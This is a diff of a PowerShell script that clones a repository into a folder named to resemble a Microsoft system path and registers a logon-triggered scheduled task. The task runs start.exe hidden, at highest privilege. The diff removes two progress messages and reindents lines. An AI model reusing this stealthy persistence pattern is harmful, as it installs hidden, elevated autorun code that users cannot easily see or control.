@@ -18,14 +18,12 @@ $Path = "C:\Microsoft\ps_1\cache"
 # Path to executable
 [string]$ExecPath = "$Path\$RepoName\start.exe"
 
-Write-Host "`nCreating path..." -ForegroundColor Cyan
 $Path = New-Item -ItemType Directory -Path $Path -Force
 
 Write-Host "`nPATH CREATED" -ForegroundColor Green
 Set-Location $Path.FullName
 
 # Clone the repo
-Write-Host "`nCloning script..." -ForegroundColor Cyan
 git clone $RepoURL
 
 # Elevate permission
@@ -43,8 +41,8 @@ if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Adm
 try {
     # Set Task Scheduler Action
     $Action = New-ScheduledTaskAction `
-    -Execute "powershell.exe" `
-    -Argument "-NoProfile -WindowStyle Hidden -Command `"$ExecPath $Arguments`""
+        -Execute "powershell.exe" `
+        -Argument "-NoProfile -WindowStyle Hidden -Command `"$ExecPath $Arguments`""
 
     # When to run (Trigger/Event)
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -54,9 +52,9 @@ try {
 
     # SYSTEM account for AtStartup tasks
     $Principal = New-ScheduledTaskPrincipal `
-    -UserId "$env:USERNAME" `
-    -LogonType Interactive `
-    -RunLevel Highest
+        -UserId "$env:USERNAME" `
+        -LogonType Interactive `
+        -RunLevel Highest
 
     # Check if task already exist; remove if true, and replace with new one
     if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
